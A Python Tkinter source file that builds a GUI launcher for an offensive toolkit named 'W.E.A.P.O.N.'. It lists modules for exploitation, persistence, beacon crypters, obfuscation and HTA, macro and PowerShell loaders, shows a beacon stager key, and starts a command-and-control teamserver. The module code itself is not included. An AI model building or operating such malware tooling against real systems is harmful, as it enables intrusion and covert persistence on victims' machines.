import tkinter as tk
from tkinter import ttk, scrolledtext
import threading
import importlib
import sys
import io
import subprocess
from configs.config import STAGER_KEY

# Modules mapping from your original weapon.py
MODULES = {
    "access":        	     "modules.access.access_tool",
    "wireless":         	 "modules.wireless.wireless_tool",
    "navigation":       	 "modules.navigation.nav_recon",
    "exploit":       	     "modules.exploitation.exploit_launcher",
    "obfuscate":     	     "modules.obfuscation.obfuscator",
    "persist":        	     "modules.persistence.persist",
    "beacon":              	 "core.beacon.beacon_creator",
    "beacon_lvl1_crypter":   "core.beacon.crypter1",
    "beacon_lvl2_crypter":   "core.beacon.crypter2",
    "aes":                   "core.crypto.aes_crypto",
    "chacha":                "core.crypto.chacha20_poly1305",
    "xor":                   "core.crypto.xor_encoder",
    "keygen":                "core.crypto.keygen",
    "loader_exe":            "core.loader.exe_stub_loader",
    "loader_hta":            "core.loader.hta_loader",
    "loader_macro":          "core.loader.macro_generator",
    "loader_ps":             "core.loader.powershell_loader"
}
BANNER_LINES = [
    "_  _  _   _______   _______    _____     _____    __   _",
    "|  |  |   |______   |_____|   |_____]   |     |   | \\  |",
    "|__|__| . |______ . |     | . |       . |_____| . |  \\_|",
    "________________________________________________________________________________",
    "W.E.A.P.O.N. - Wireless Exploitation Access Persistence Obfuscation & Navigation",
    "by WebDragon63",
    "________________________________________________________________________________"
]


class WeaponGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("W.E.A.P.O.N Framework GUI")
        self.geometry("1300x800")
        self.configure(bg="black")
        
        # Banner with glowing cyan animation
        self.banner_label = tk.Label(self, text="", font=("Consolas", 14, "bold"), fg="#00ffff", bg="black")
        key_frame = tk.Frame(self, bg="black")
        key_frame.pack(pady=5)
        
        tk.Label(
        	key_frame,
        	text="Stager Key For The Beacon:",
        	fg="#FF00FF",
        	bg="black",
        	font=("Consolas", 10, "bold")
        ).pack(side=tk.LEFT, padx=5)
        
        self.stager_key_entry = tk.Entry(
        	key_frame,
        	font=("Consolas", 10, "bold"),
        	fg="cyan",
        	bg="#1C1C1C",
        	width=30,
        	readonlybackground="black",
        	relief=tk.FLAT
        )
        self.stager_key_entry.insert(0, STAGER_KEY)
        self.stager_key_entry.config(state='readonly')
        self.stager_key_entry.pack(side=tk.LEFT, padx=5)
        
        self.banner_label.pack(pady=10)
        self.banner_index = 0
        self.glow_state = True
        self.animate_banner()

        # Module selection frame
        frame = tk.Frame(self, bg="cyan")
        frame.pack(pady=10)
        tk.Label(frame, text="Select Module:", fg="#00ffff", bg="black", font=("Consolas", 12)).pack(side=tk.LEFT, padx=5)
        self.module_var = tk.StringVar(value="access")
        self.module_dropdown = ttk.Combobox(frame, textvariable=self.module_var, values=list(MODULES.keys()), state="readonly", width=20)
        self.module_dropdown.pack(side=tk.LEFT, padx=5)
        
        tk.Label(frame, text="Arguments:", fg="#00ffff", bg="black", font=("Consolas", 12)).pack(side=tk.LEFT, padx=5)
        self.args_entry = tk.Entry(frame, width=50)
        self.args_entry.pack(side=tk.LEFT, padx=5)

        self.run_button = tk.Button(self, text="Run Module", command=self.run_module_thread, bg="#00ffff", fg="black", font=("Consolas", 12, "bold"))
        self.run_button.pack(pady=10)

        # Launch Teamserver button
        self.launch_teamserver_button = tk.Button(self, text="Launch Teamserver", command=self.launch_teamserver, bg="#FF00FF", fg="black", font=("Consolas", 12, "bold"))
        self.launch_teamserver_button.pack(pady=10)

        # Output box
        self.output_text = scrolledtext.ScrolledText(self, bg="#1C1C1C", fg="#00ffff", font=("Consolas", 11), height=20, state=tk.DISABLED)
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def animate_banner(self):
        color_on = "#00ffff"
        color_off = "#003333"
        text = "\n".join(BANNER_LINES)
        color = color_on if self.glow_state else color_off
        self.banner_label.config(text=text, fg=color)
        self.glow_state = not self.glow_state
        self.after(600, self.animate_banner)

    def run_module_thread(self):
        threading.Thread(target=self.run_module, daemon=True).start()

    def run_module(self):
        module_name = self.module_var.get()
        args_text = self.args_entry.get()
        args = args_text.split() if args_text else []

        if module_name not in MODULES:
            self.append_output(f"[!] Unknown module: {module_name}\n")
            return

        try:
            mod = importlib.import_module(MODULES[module_name])
            if not hasattr(mod, "main"):
                self.append_output(f"[!] Module '{module_name}' does not implement a main() function.\n")
                return

            old_stdout = sys.stdout
            old_stderr = sys.stderr
            sys.stdout = sys.stderr = io.StringIO()

            sys.argv = [module_name] + args

            try:
                mod.main()
            except SystemExit:
                pass

            output = sys.stdout.getvalue()
            self.append_output(output)

        except Exception as e:
            self.append_output(f"[!] Error launching module '{module_name}': {e}\n")

        finally:
            sys.stdout = old_stdout
            sys.stderr = old_stderr

    def launch_teamserver(self):
        threading.Thread(target=self._start_teamserver_process, daemon=True).start()

    def _start_teamserver_process(self):
        try:
            cmd = ["python3", "modules/teamserver/teamserver.py"]
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            self.append_output("[*] Launching teamserver...\n")

            # Read stdout asynchronously
            for line in proc.stdout:
                self.append_output(line)
            # Read stderr asynchronously
            for line in proc.stderr:
                self.append_output(line)

            proc.wait()
            self.append_output(f"\n[Teamserver exited with code {proc.returncode}]\n")
        except Exception as e:
            self.append_output(f"[!] Failed to launch teamserver: {e}\n")

    def append_output(self, text):
        self.output_text.configure(state=tk.NORMAL)
        self.output_text.insert(tk.END, text)
        self.output_text.see(tk.END)
        self.output_text.configure(state=tk.DISABLED)

def main():
    app = WeaponGUI()
    app.mainloop()

if __name__ == "__main__":
    main()

